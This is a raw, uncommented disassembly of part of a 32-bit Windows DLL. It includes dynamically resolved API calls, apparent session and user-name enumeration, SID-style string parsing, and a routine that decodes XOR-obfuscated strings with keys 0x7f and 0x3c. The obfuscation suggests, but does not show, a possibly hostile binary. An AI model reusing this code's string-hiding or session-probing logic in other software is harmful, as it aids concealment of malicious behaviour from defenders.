10007370:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
10007376:	6a 02                	push   $0x2
10007378:	6a 54                	push   $0x54
1000737a:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
10007380:	50                   	push   %eax
10007381:	ff 15 60 e0 00 10    	call   *0x1000e060
10007387:	ff 75 0c             	push   0xc(%ebp)
1000738a:	56                   	push   %esi
1000738b:	6a 02                	push   $0x2
1000738d:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
10007393:	50                   	push   %eax
10007394:	ff 15 5c e0 00 10    	call   *0x1000e05c
1000739a:	56                   	push   %esi
1000739b:	8d 45 bc             	lea    -0x44(%ebp),%eax
1000739e:	50                   	push   %eax
1000739f:	ff 15 58 e0 00 10    	call   *0x1000e058
100073a5:	c6 45 d8 01          	movb   $0x1,-0x28(%ebp)
100073a9:	c6 45 d9 01          	movb   $0x1,-0x27(%ebp)
100073ad:	88 5d da             	mov    %bl,-0x26(%ebp)
100073b0:	88 5d db             	mov    %bl,-0x25(%ebp)
100073b3:	88 5d dc             	mov    %bl,-0x24(%ebp)
100073b6:	88 5d dd             	mov    %bl,-0x23(%ebp)
100073b9:	88 5d de             	mov    %bl,-0x22(%ebp)
100073bc:	c6 45 df 01          	movb   $0x1,-0x21(%ebp)
100073c0:	89 5d e0             	mov    %ebx,-0x20(%ebp)
100073c3:	53                   	push   %ebx
100073c4:	8d 45 d8             	lea    -0x28(%ebp),%eax
100073c7:	50                   	push   %eax
100073c8:	8d 45 bc             	lea    -0x44(%ebp),%eax
100073cb:	50                   	push   %eax
100073cc:	ff 15 54 e0 00 10    	call   *0x1000e054
100073d2:	53                   	push   %ebx
100073d3:	8d 45 d8             	lea    -0x28(%ebp),%eax
100073d6:	50                   	push   %eax
100073d7:	8d 45 bc             	lea    -0x44(%ebp),%eax
100073da:	50                   	push   %eax
100073db:	ff 15 50 e0 00 10    	call   *0x1000e050
100073e1:	53                   	push   %ebx
100073e2:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
100073e8:	50                   	push   %eax
100073e9:	56                   	push   %esi
100073ea:	8d 45 bc             	lea    -0x44(%ebp),%eax
100073ed:	50                   	push   %eax
100073ee:	ff 15 70 e0 00 10    	call   *0x1000e070
100073f4:	89 9d 40 ff ff ff    	mov    %ebx,-0xc0(%ebp)
100073fa:	89 9d 44 ff ff ff    	mov    %ebx,-0xbc(%ebp)
10007400:	89 9d 48 ff ff ff    	mov    %ebx,-0xb8(%ebp)
10007406:	89 b5 4c ff ff ff    	mov    %esi,-0xb4(%ebp)
1000740c:	c7 45 d0 14 00 00 00 	movl   $0x14,-0x30(%ebp)
10007413:	ff 75 10             	push   0x10(%ebp)
10007416:	8d 45 d4             	lea    -0x2c(%ebp),%eax
10007419:	50                   	push   %eax
1000741a:	8d 45 d0             	lea    -0x30(%ebp),%eax
1000741d:	50                   	push   %eax
1000741e:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
10007424:	50                   	push   %eax
10007425:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
1000742b:	50                   	push   %eax
1000742c:	56                   	push   %esi
1000742d:	ff 75 08             	push   0x8(%ebp)
10007430:	8d 45 bc             	lea    -0x44(%ebp),%eax
10007433:	50                   	push   %eax
10007434:	ff 15 18 e0 00 10    	call   *0x1000e018
1000743a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000743d:	eb 07                	jmp    0x10007446
1000743f:	6a 01                	push   $0x1
10007441:	58                   	pop    %eax
10007442:	c3                   	ret
10007443:	8b 65 e8             	mov    -0x18(%ebp),%esp
10007446:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000744a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000744d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10007450:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10007457:	5f                   	pop    %edi
10007458:	5e                   	pop    %esi
10007459:	5b                   	pop    %ebx
1000745a:	c9                   	leave
1000745b:	c2 0c 00             	ret    $0xc
1000745e:	55                   	push   %ebp
1000745f:	8b ec                	mov    %esp,%ebp
10007461:	6a ff                	push   $0xffffffff
10007463:	68 68 e4 00 10       	push   $0x1000e468
10007468:	68 00 c6 00 10       	push   $0x1000c600
1000746d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10007473:	50                   	push   %eax
10007474:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000747b:	83 ec 14             	sub    $0x14,%esp
1000747e:	53                   	push   %ebx
1000747f:	56                   	push   %esi
10007480:	57                   	push   %edi
10007481:	89 65 e8             	mov    %esp,-0x18(%ebp)
10007484:	33 f6                	xor    %esi,%esi
10007486:	89 75 fc             	mov    %esi,-0x4(%ebp)
10007489:	89 75 e4             	mov    %esi,-0x1c(%ebp)
1000748c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000748f:	50                   	push   %eax
10007490:	6a 01                	push   $0x1
10007492:	ff 75 08             	push   0x8(%ebp)
10007495:	ff 15 cc e0 00 10    	call   *0x1000e0cc
1000749b:	50                   	push   %eax
1000749c:	ff 15 68 e0 00 10    	call   *0x1000e068
100074a2:	85 c0                	test   %eax,%eax
100074a4:	75 6f                	jne    0x10007515
100074a6:	ff 15 60 e1 00 10    	call   *0x1000e160
100074ac:	3d f0 03 00 00       	cmp    $0x3f0,%eax
100074b1:	75 72                	jne    0x10007525
100074b3:	39 75 0c             	cmp    %esi,0xc(%ebp)
100074b6:	74 05                	je     0x100074bd
100074b8:	6a 02                	push   $0x2
100074ba:	58                   	pop    %eax
100074bb:	eb 03                	jmp    0x100074c0
100074bd:	8b 45 08             	mov    0x8(%ebp),%eax
100074c0:	89 45 e0             	mov    %eax,-0x20(%ebp)
100074c3:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
100074c6:	51                   	push   %ecx
100074c7:	50                   	push   %eax
100074c8:	ff 15 c8 e0 00 10    	call   *0x1000e0c8
100074ce:	50                   	push   %eax
100074cf:	ff 15 1c e0 00 10    	call   *0x1000e01c
100074d5:	85 c0                	test   %eax,%eax
100074d7:	74 4c                	je     0x10007525
100074d9:	39 75 0c             	cmp    %esi,0xc(%ebp)
100074dc:	74 37                	je     0x10007515
100074de:	8d 45 dc             	lea    -0x24(%ebp),%eax
100074e1:	50                   	push   %eax
100074e2:	6a 02                	push   $0x2
100074e4:	ff 75 10             	push   0x10(%ebp)
100074e7:	56                   	push   %esi
100074e8:	ff 75 08             	push   0x8(%ebp)
100074eb:	ff 75 e4             	push   -0x1c(%ebp)
100074ee:	ff 15 64 e0 00 10    	call   *0x1000e064
100074f4:	85 c0                	test   %eax,%eax
100074f6:	75 03                	jne    0x100074fb
100074f8:	89 75 dc             	mov    %esi,-0x24(%ebp)
100074fb:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
100074fe:	74 0c                	je     0x1000750c
10007500:	ff 75 e4             	push   -0x1c(%ebp)
10007503:	ff 15 30 e1 00 10    	call   *0x1000e130
10007509:	89 75 e4             	mov    %esi,-0x1c(%ebp)
1000750c:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10007510:	8b 45 dc             	mov    -0x24(%ebp),%eax
10007513:	eb 16                	jmp    0x1000752b
10007515:	8b 45 e4             	mov    -0x1c(%ebp),%eax
10007518:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000751c:	eb 0d                	jmp    0x1000752b
1000751e:	6a 01                	push   $0x1
10007520:	58                   	pop    %eax
10007521:	c3                   	ret
10007522:	8b 65 e8             	mov    -0x18(%ebp),%esp
10007525:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10007529:	33 c0                	xor    %eax,%eax
1000752b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000752e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10007535:	5f                   	pop    %edi
10007536:	5e                   	pop    %esi
10007537:	5b                   	pop    %ebx
10007538:	c9                   	leave
10007539:	c3                   	ret
1000753a:	55                   	push   %ebp
1000753b:	8b ec                	mov    %esp,%ebp
1000753d:	83 ec 20             	sub    $0x20,%esp
10007540:	8d 45 e0             	lea    -0x20(%ebp),%eax
10007543:	6a 01                	push   $0x1
10007545:	50                   	push   %eax
10007546:	ff 15 58 e0 00 10    	call   *0x1000e058
1000754c:	85 c0                	test   %eax,%eax
1000754e:	74 24                	je     0x10007574
10007550:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10007554:	8d 45 e0             	lea    -0x20(%ebp),%eax
10007557:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000755a:	68 70 01 01 10       	push   $0x10010170
1000755f:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007562:	6a 00                	push   $0x0
10007564:	50                   	push   %eax
10007565:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
1000756c:	ff 15 d0 e0 00 10    	call   *0x1000e0d0
10007572:	c9                   	leave
10007573:	c3                   	ret
10007574:	33 c0                	xor    %eax,%eax
10007576:	c9                   	leave
10007577:	c3                   	ret
10007578:	55                   	push   %ebp
10007579:	8b ec                	mov    %esp,%ebp
1000757b:	81 ec 94 00 00 00    	sub    $0x94,%esp
10007581:	68 94 00 00 00       	push   $0x94
10007586:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
1000758c:	6a 00                	push   $0x0
1000758e:	50                   	push   %eax
1000758f:	e8 82 5d 00 00       	call   0x1000d316
10007594:	83 c4 0c             	add    $0xc,%esp
10007597:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
1000759d:	c7 85 6c ff ff ff 94 	movl   $0x94,-0x94(%ebp)
100075a4:	00 00 00 
100075a7:	50                   	push   %eax
100075a8:	ff 15 b8 e0 00 10    	call   *0x1000e0b8
100075ae:	85 c0                	test   %eax,%eax
100075b0:	75 05                	jne    0x100075b7
100075b2:	6a 63                	push   $0x63
100075b4:	58                   	pop    %eax
100075b5:	c9                   	leave
100075b6:	c3                   	ret
100075b7:	8b 45 08             	mov    0x8(%ebp),%eax
100075ba:	85 c0                	test   %eax,%eax
100075bc:	74 08                	je     0x100075c6
100075be:	8b 8d 70 ff ff ff    	mov    -0x90(%ebp),%ecx
100075c4:	89 08                	mov    %ecx,(%eax)
100075c6:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
100075cc:	c9                   	leave
100075cd:	c3                   	ret
100075ce:	56                   	push   %esi
100075cf:	8b 74 24 08          	mov    0x8(%esp),%esi
100075d3:	56                   	push   %esi
100075d4:	e8 87 5d 00 00       	call   0x1000d360
100075d9:	59                   	pop    %ecx
100075da:	33 c9                	xor    %ecx,%ecx
100075dc:	85 c0                	test   %eax,%eax
100075de:	7e 0c                	jle    0x100075ec
100075e0:	8a 54 24 0c          	mov    0xc(%esp),%dl
100075e4:	30 14 31             	xor    %dl,(%ecx,%esi,1)
100075e7:	41                   	inc    %ecx
100075e8:	3b c8                	cmp    %eax,%ecx
100075ea:	7c f4                	jl     0x100075e0
100075ec:	5e                   	pop    %esi
100075ed:	c3                   	ret
100075ee:	6a 7f                	push   $0x7f
100075f0:	ff 74 24 08          	push   0x8(%esp)
100075f4:	e8 d5 ff ff ff       	call   0x100075ce
100075f9:	59                   	pop    %ecx
100075fa:	59                   	pop    %ecx
100075fb:	c3                   	ret
100075fc:	6a 3c                	push   $0x3c
100075fe:	ff 74 24 08          	push   0x8(%esp)
10007602:	e8 c7 ff ff ff       	call   0x100075ce
10007607:	59                   	pop    %ecx
10007608:	59                   	pop    %ecx
10007609:	c3                   	ret
1000760a:	55                   	push   %ebp
1000760b:	8b ec                	mov    %esp,%ebp
1000760d:	51                   	push   %ecx
1000760e:	56                   	push   %esi
1000760f:	ff 75 08             	push   0x8(%ebp)
10007612:	ff 15 14 e0 00 10    	call   *0x1000e014
10007618:	85 c0                	test   %eax,%eax
1000761a:	74 35                	je     0x10007651
1000761c:	ff 75 08             	push   0x8(%ebp)
1000761f:	ff 15 6c e0 00 10    	call   *0x1000e06c
10007625:	ff 75 08             	push   0x8(%ebp)
10007628:	8b f0                	mov    %eax,%esi
1000762a:	ff 15 24 e0 00 10    	call   *0x1000e024
10007630:	0f b6 00             	movzbl (%eax),%eax
10007633:	8b 4d 10             	mov    0x10(%ebp),%ecx
10007636:	89 45 fc             	mov    %eax,-0x4(%ebp)
10007639:	8d 04 40             	lea    (%eax,%eax,2),%eax
1000763c:	8d 04 85 1c 00 00 00 	lea    0x1c(,%eax,4),%eax
10007643:	39 01                	cmp    %eax,(%ecx)
10007645:	73 11                	jae    0x10007658
10007647:	6a 7a                	push   $0x7a
10007649:	89 01                	mov    %eax,(%ecx)
1000764b:	ff 15 d4 e0 00 10    	call   *0x1000e0d4
10007651:	33 c0                	xor    %eax,%eax
10007653:	e9 c1 00 00 00       	jmp    0x10007719
10007658:	53                   	push   %ebx
10007659:	8b 5d 0c             	mov    0xc(%ebp),%ebx
1000765c:	57                   	push   %edi
1000765d:	8b 3d 0c e2 00 10    	mov    0x1000e20c,%edi
10007663:	6a 01                	push   $0x1
10007665:	68 cc 02 01 10       	push   $0x100102cc
1000766a:	53                   	push   %ebx
1000766b:	ff d7                	call   *%edi
1000766d:	89 45 10             	mov    %eax,0x10(%ebp)
10007670:	8a 06                	mov    (%esi),%al
10007672:	83 c4 0c             	add    $0xc,%esp
10007675:	84 c0                	test   %al,%al
10007677:	75 3b                	jne    0x100076b4
10007679:	38 46 01             	cmp    %al,0x1(%esi)
1000767c:	75 36                	jne    0x100076b4
1000767e:	0f b6 46 02          	movzbl 0x2(%esi),%eax
10007682:	0f b6 4e 03          	movzbl 0x3(%esi),%ecx
10007686:	c1 e0 08             	shl    $0x8,%eax
10007689:	03 c1                	add    %ecx,%eax
1000768b:	0f b6 4e 04          	movzbl 0x4(%esi),%ecx
1000768f:	c1 e0 08             	shl    $0x8,%eax
10007692:	03 c1                	add    %ecx,%eax
10007694:	0f b6 4e 05          	movzbl 0x5(%esi),%ecx
10007698:	c1 e0 08             	shl    $0x8,%eax
1000769b:	03 c1                	add    %ecx,%eax
1000769d:	50                   	push   %eax
1000769e:	68 c8 02 01 10       	push   $0x100102c8
100076a3:	53                   	push   %ebx
100076a4:	ff 15 a8 e0 00 10    	call   *0x1000e0a8
100076aa:	03 c3                	add    %ebx,%eax
100076ac:	50                   	push   %eax
100076ad:	ff d7                	call   *%edi
100076af:	83 c4 0c             	add    $0xc,%esp
100076b2:	eb 31                	jmp    0x100076e5
100076b4:	0f b6 4e 05          	movzbl 0x5(%esi),%ecx
100076b8:	51                   	push   %ecx
100076b9:	0f b6 4e 04          	movzbl 0x4(%esi),%ecx
100076bd:	51                   	push   %ecx
100076be:	0f b6 4e 03          	movzbl 0x3(%esi),%ecx
100076c2:	51                   	push   %ecx
100076c3:	0f b6 4e 02          	movzbl 0x2(%esi),%ecx
100076c7:	51                   	push   %ecx
100076c8:	0f b6 4e 01          	movzbl 0x1(%esi),%ecx
100076cc:	0f b6 c0             	movzbl %al,%eax
100076cf:	51                   	push   %ecx
100076d0:	50                   	push   %eax
100076d1:	68 a4 02 01 10       	push   $0x100102a4
100076d6:	53                   	push   %ebx
100076d7:	ff 15 a8 e0 00 10    	call   *0x1000e0a8
100076dd:	03 c3                	add    %ebx,%eax
100076df:	50                   	push   %eax
100076e0:	ff d7                	call   *%edi
100076e2:	83 c4 20             	add    $0x20,%esp
100076e5:	01 45 10             	add    %eax,0x10(%ebp)
100076e8:	33 f6                	xor    %esi,%esi
100076ea:	39 75 fc             	cmp    %esi,-0x4(%ebp)
100076ed:	76 25                	jbe    0x10007714
100076ef:	56                   	push   %esi
100076f0:	ff 75 08             	push   0x8(%ebp)
100076f3:	ff 15 28 e0 00 10    	call   *0x1000e028
100076f9:	ff 30                	push   (%eax)
100076fb:	8b 45 10             	mov    0x10(%ebp),%eax
100076fe:	03 c3                	add    %ebx,%eax
10007700:	68 9c 02 01 10       	push   $0x1001029c
10007705:	50                   	push   %eax
10007706:	ff d7                	call   *%edi
10007708:	01 45 10             	add    %eax,0x10(%ebp)
1000770b:	83 c4 0c             	add    $0xc,%esp
1000770e:	46                   	inc    %esi
1000770f:	3b 75 fc             	cmp    -0x4(%ebp),%esi
10007712:	72 db                	jb     0x100076ef
10007714:	6a 01                	push   $0x1
10007716:	58                   	pop    %eax
10007717:	5f                   	pop    %edi
10007718:	5b                   	pop    %ebx
10007719:	5e                   	pop    %esi
1000771a:	c9                   	leave
1000771b:	c3                   	ret
1000771c:	55                   	push   %ebp
1000771d:	8b ec                	mov    %esp,%ebp
1000771f:	81 ec 30 04 00 00    	sub    $0x430,%esp
10007725:	53                   	push   %ebx
10007726:	56                   	push   %esi
10007727:	57                   	push   %edi
10007728:	33 db                	xor    %ebx,%ebx
1000772a:	6a 06                	push   $0x6
1000772c:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000772f:	53                   	push   %ebx
10007730:	50                   	push   %eax
10007731:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10007734:	88 5d f0             	mov    %bl,-0x10(%ebp)
10007737:	89 5d d0             	mov    %ebx,-0x30(%ebp)
1000773a:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
1000773d:	89 5d d8             	mov    %ebx,-0x28(%ebp)
10007740:	89 5d dc             	mov    %ebx,-0x24(%ebp)
10007743:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10007746:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
10007749:	89 5d e8             	mov    %ebx,-0x18(%ebp)
1000774c:	89 5d ec             	mov    %ebx,-0x14(%ebp)
1000774f:	e8 c2 5b 00 00       	call   0x1000d316
10007754:	83 c4 0c             	add    $0xc,%esp
10007757:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1000775d:	ff 75 08             	push   0x8(%ebp)
10007760:	50                   	push   %eax
10007761:	ff 15 d8 e0 00 10    	call   *0x1000e0d8
10007767:	8b 3d 7c e1 00 10    	mov    0x1000e17c,%edi
1000776d:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
10007773:	6a 2d                	push   $0x2d
10007775:	50                   	push   %eax
10007776:	ff d7                	call   *%edi
10007778:	59                   	pop    %ecx
10007779:	3b c3                	cmp    %ebx,%eax
1000777b:	59                   	pop    %ecx
1000777c:	0f 84 04 01 00 00    	je     0x10007886
10007782:	40                   	inc    %eax
10007783:	6a 2d                	push   $0x2d
10007785:	50                   	push   %eax
10007786:	ff d7                	call   *%edi
10007788:	59                   	pop    %ecx
10007789:	3b c3                	cmp    %ebx,%eax
1000778b:	59                   	pop    %ecx
1000778c:	0f 84 f4 00 00 00    	je     0x10007886
10007792:	40                   	inc    %eax
10007793:	6a 2d                	push   $0x2d
10007795:	50                   	push   %eax
10007796:	89 45 08             	mov    %eax,0x8(%ebp)
10007799:	ff d7                	call   *%edi
1000779b:	8b f0                	mov    %eax,%esi
1000779d:	59                   	pop    %ecx
1000779e:	3b f3                	cmp    %ebx,%esi
100077a0:	59                   	pop    %ecx
100077a1:	0f 84 df 00 00 00    	je     0x10007886
100077a7:	8b 45 08             	mov    0x8(%ebp),%eax
100077aa:	88 1e                	mov    %bl,(%esi)
100077ac:	80 38 30             	cmpb   $0x30,(%eax)
100077af:	75 2f                	jne    0x100077e0
100077b1:	80 78 01 78          	cmpb   $0x78,0x1(%eax)
100077b5:	75 29                	jne    0x100077e0
100077b7:	8d 4d fd             	lea    -0x3(%ebp),%ecx
100077ba:	51                   	push   %ecx
100077bb:	8d 4d fc             	lea    -0x4(%ebp),%ecx
100077be:	51                   	push   %ecx
100077bf:	8d 4d fb             	lea    -0x5(%ebp),%ecx
100077c2:	51                   	push   %ecx
100077c3:	8d 4d fa             	lea    -0x6(%ebp),%ecx
100077c6:	51                   	push   %ecx
100077c7:	8d 4d f9             	lea    -0x7(%ebp),%ecx
100077ca:	51                   	push   %ecx
100077cb:	8d 4d f8             	lea    -0x8(%ebp),%ecx
100077ce:	51                   	push   %ecx
100077cf:	68 a4 02 01 10       	push   $0x100102a4
100077d4:	50                   	push   %eax
100077d5:	ff 15 a4 e1 00 10    	call   *0x1000e1a4
100077db:	83 c4 20             	add    $0x20,%esp
100077de:	eb 22                	jmp    0x10007802
100077e0:	8d 4d 08             	lea    0x8(%ebp),%ecx
100077e3:	51                   	push   %ecx
100077e4:	68 c8 02 01 10       	push   $0x100102c8
100077e9:	50                   	push   %eax
100077ea:	ff 15 a4 e1 00 10    	call   *0x1000e1a4
100077f0:	8a 45 08             	mov    0x8(%ebp),%al
100077f3:	83 c4 0c             	add    $0xc,%esp
100077f6:	88 45 fd             	mov    %al,-0x3(%ebp)
100077f9:	88 5d fc             	mov    %bl,-0x4(%ebp)
100077fc:	88 5d fb             	mov    %bl,-0x5(%ebp)
100077ff:	88 5d fa             	mov    %bl,-0x6(%ebp)
10007802:	c6 06 2d             	movb   $0x2d,(%esi)
10007805:	8b c6                	mov    %esi,%eax
10007807:	46                   	inc    %esi
10007808:	89 5d 08             	mov    %ebx,0x8(%ebp)
1000780b:	6a 2d                	push   $0x2d
1000780d:	50                   	push   %eax
1000780e:	ff d7                	call   *%edi
10007810:	59                   	pop    %ecx
10007811:	3b c3                	cmp    %ebx,%eax
10007813:	59                   	pop    %ecx
10007814:	74 0f                	je     0x10007825
10007816:	88 18                	mov    %bl,(%eax)
10007818:	40                   	inc    %eax
10007819:	fe 45 f0             	incb   -0x10(%ebp)
1000781c:	ff 45 08             	incl   0x8(%ebp)
1000781f:	83 7d 08 08          	cmpl   $0x8,0x8(%ebp)
10007823:	7c e6                	jl     0x1000780b
10007825:	0f b6 45 f0          	movzbl -0x10(%ebp),%eax
10007829:	3b c3                	cmp    %ebx,%eax
1000782b:	7e 29                	jle    0x10007856
1000782d:	8d 7d d0             	lea    -0x30(%ebp),%edi
10007830:	89 45 08             	mov    %eax,0x8(%ebp)
10007833:	57                   	push   %edi
10007834:	68 c8 02 01 10       	push   $0x100102c8
10007839:	56                   	push   %esi
1000783a:	ff 15 a4 e1 00 10    	call   *0x1000e1a4
10007840:	83 c4 0c             	add    $0xc,%esp
10007843:	56                   	push   %esi
10007844:	ff 15 a8 e0 00 10    	call   *0x1000e0a8
1000784a:	83 c7 04             	add    $0x4,%edi
1000784d:	ff 4d 08             	decl   0x8(%ebp)
10007850:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
10007854:	75 dd                	jne    0x10007833
10007856:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007859:	50                   	push   %eax
1000785a:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000785d:	ff 75 ec             	push   -0x14(%ebp)
10007860:	ff 75 e8             	push   -0x18(%ebp)
10007863:	ff 75 e4             	push   -0x1c(%ebp)
10007866:	ff 75 e0             	push   -0x20(%ebp)
10007869:	ff 75 dc             	push   -0x24(%ebp)
1000786c:	ff 75 d8             	push   -0x28(%ebp)
1000786f:	ff 75 d4             	push   -0x2c(%ebp)
10007872:	ff 75 d0             	push   -0x30(%ebp)
10007875:	ff 75 f0             	push   -0x10(%ebp)
10007878:	50                   	push   %eax
10007879:	ff 15 34 e0 00 10    	call   *0x1000e034
1000787f:	85 c0                	test   %eax,%eax
10007881:	75 03                	jne    0x10007886
10007883:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10007886:	8b 45 f4             	mov    -0xc(%ebp),%eax
10007889:	5f                   	pop    %edi
1000788a:	5e                   	pop    %esi
1000788b:	5b                   	pop    %ebx
1000788c:	c9                   	leave
1000788d:	c3                   	ret
1000788e:	55                   	push   %ebp
1000788f:	8b ec                	mov    %esp,%ebp
10007891:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
10007897:	53                   	push   %ebx
10007898:	56                   	push   %esi
10007899:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000789c:	57                   	push   %edi
1000789d:	33 db                	xor    %ebx,%ebx
1000789f:	50                   	push   %eax
100078a0:	89 5d d8             	mov    %ebx,-0x28(%ebp)
100078a3:	c6 45 dc 12          	movb   $0x12,-0x24(%ebp)
100078a7:	c6 45 dd 78          	movb   $0x78,-0x23(%ebp)
100078ab:	c6 45 de 79          	movb   $0x79,-0x22(%ebp)
100078af:	c6 45 df 7a          	movb   $0x7a,-0x21(%ebp)
100078b3:	c6 45 e0 7d          	movb   $0x7d,-0x20(%ebp)
100078b7:	c6 45 e1 69          	movb   $0x69,-0x1f(%ebp)
100078bb:	c6 45 e2 70          	movb   $0x70,-0x1e(%ebp)
100078bf:	c6 45 e3 68          	movb   $0x68,-0x1d(%ebp)
100078c3:	88 5d e4             	mov    %bl,-0x1c(%ebp)
100078c6:	e8 31 fd ff ff       	call   0x100075fc
100078cb:	c7 04 24 0c 02 01 10 	movl   $0x1001020c,(%esp)
100078d2:	ff 15 14 e1 00 10    	call   *0x1000e114
100078d8:	8b f8                	mov    %eax,%edi
100078da:	3b fb                	cmp    %ebx,%edi
100078dc:	89 7d cc             	mov    %edi,-0x34(%ebp)
100078df:	74 54                	je     0x10007935
100078e1:	8b 35 1c e1 00 10    	mov    0x1000e11c,%esi
100078e7:	68 1c 02 01 10       	push   $0x1001021c
100078ec:	57                   	push   %edi
100078ed:	ff d6                	call   *%esi
100078ef:	68 34 02 01 10       	push   $0x10010234
100078f4:	57                   	push   %edi
100078f5:	a3 2c 08 01 10       	mov    %eax,0x1001082c
100078fa:	ff d6                	call   *%esi
100078fc:	68 50 02 01 10       	push   $0x10010250
10007901:	57                   	push   %edi
10007902:	a3 30 08 01 10       	mov    %eax,0x10010830
10007907:	ff d6                	call   *%esi
10007909:	39 1d 2c 08 01 10    	cmp    %ebx,0x1001082c
1000790f:	a3 34 08 01 10       	mov    %eax,0x10010834
10007914:	74 15                	je     0x1000792b
10007916:	39 1d 30 08 01 10    	cmp    %ebx,0x10010830
1000791c:	74 0d                	je     0x1000792b
1000791e:	3b c3                	cmp    %ebx,%eax
10007920:	74 09                	je     0x1000792b
10007922:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
10007929:	eb 0a                	jmp    0x10007935
1000792b:	57                   	push   %edi
1000792c:	ff 15 98 e0 00 10    	call   *0x1000e098
10007932:	89 5d cc             	mov    %ebx,-0x34(%ebp)
10007935:	c7 45 fc dd 04 00 00 	movl   $0x4dd,-0x4(%ebp)
1000793c:	ff 15 dc e0 00 10    	call   *0x1000e0dc
10007942:	3d 00 00 00 80       	cmp    $0x80000000,%eax
10007947:	0f 83 bf 01 00 00    	jae    0x10007b0c
1000794d:	83 7d d8 01          	cmpl   $0x1,-0x28(%ebp)
10007951:	0f 85 b5 01 00 00    	jne    0x10007b0c
10007957:	8d 45 bc             	lea    -0x44(%ebp),%eax
1000795a:	50                   	push   %eax
1000795b:	8d 45 e8             	lea    -0x18(%ebp),%eax
1000795e:	50                   	push   %eax
1000795f:	6a 01                	push   $0x1
10007961:	53                   	push   %ebx
10007962:	53                   	push   %ebx
10007963:	ff 15 2c 08 01 10    	call   *0x1001082c
10007969:	85 c0                	test   %eax,%eax
1000796b:	0f 84 9b 01 00 00    	je     0x10007b0c
10007971:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
10007974:	89 5d ec             	mov    %ebx,-0x14(%ebp)
10007977:	0f 86 73 01 00 00    	jbe    0x10007af0
1000797d:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
10007980:	8b 45 e8             	mov    -0x18(%ebp),%eax
10007983:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
10007986:	03 c1                	add    %ecx,%eax
10007988:	39 58 08             	cmp    %ebx,0x8(%eax)
1000798b:	0f 85 4c 01 00 00    	jne    0x10007add
10007991:	8d 4d c0             	lea    -0x40(%ebp),%ecx
10007994:	51                   	push   %ecx
10007995:	8d 4d f8             	lea    -0x8(%ebp),%ecx
10007998:	51                   	push   %ecx
10007999:	6a 05                	push   $0x5
1000799b:	ff 30                	push   (%eax)
1000799d:	53                   	push   %ebx
1000799e:	ff 15 30 08 01 10    	call   *0x10010830
100079a4:	85 c0                	test   %eax,%eax
100079a6:	0f 84 31 01 00 00    	je     0x10007add
100079ac:	8d 45 b8             	lea    -0x48(%ebp),%eax
100079af:	8b 3d 08 e0 00 10    	mov    0x1000e008,%edi
100079b5:	50                   	push   %eax
100079b6:	8d 45 c8             	lea    -0x38(%ebp),%eax
100079b9:	50                   	push   %eax
100079ba:	8d 45 d0             	lea    -0x30(%ebp),%eax
100079bd:	53                   	push   %ebx
100079be:	50                   	push   %eax
100079bf:	53                   	push   %ebx
100079c0:	89 5d d0             	mov    %ebx,-0x30(%ebp)
100079c3:	ff 75 f8             	push   -0x8(%ebp)
100079c6:	89 5d c8             	mov    %ebx,-0x38(%ebp)
100079c9:	53                   	push   %ebx
100079ca:	ff d7                	call   *%edi
100079cc:	85 c0                	test   %eax,%eax
100079ce:	0f 85 fd 00 00 00    	jne    0x10007ad1
100079d4:	ff 15 60 e1 00 10    	call   *0x1000e160
100079da:	6a 7a                	push   $0x7a
100079dc:	5e                   	pop    %esi
100079dd:	3b c6                	cmp    %esi,%eax
100079df:	0f 85 ec 00 00 00    	jne    0x10007ad1
100079e5:	ff 75 d0             	push   -0x30(%ebp)
100079e8:	e8 e3 5a 00 00       	call   0x1000d4d0
100079ed:	ff 75 c8             	push   -0x38(%ebp)
100079f0:	89 45 f4             	mov    %eax,-0xc(%ebp)
100079f3:	e8 d8 5a 00 00       	call   0x1000d4d0
100079f8:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
100079fb:	59                   	pop    %ecx
100079fc:	59                   	pop    %ecx
100079fd:	89 45 c4             	mov    %eax,-0x3c(%ebp)
10007a00:	0f 84 cb 00 00 00    	je     0x10007ad1
10007a06:	3b c3                	cmp    %ebx,%eax
